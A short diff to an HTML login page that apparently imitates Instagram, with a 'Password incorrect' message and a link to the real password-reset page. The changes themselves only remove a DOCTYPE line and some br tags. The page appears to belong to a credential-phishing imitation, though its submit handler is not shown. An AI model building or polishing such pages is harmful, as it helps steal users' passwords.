@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+
 <html lang="en">
 <head>
   <meta charset="UTF-8">
@@ -77,7 +77,7 @@
       <p class="red-text">*Password incorrect* Please check your password and try again</p>
       <br><h5><a href="https://www.instagram.com/accounts/password/reset/">Forgotten your password ?</a></h5></br>
 
-   <br><button type="button" id="loginButton" onclick="submitForm()">Login</button></br>
+   <button type="button" id="loginButton" onclick="submitForm()">Login</button>
       
  </form>
     
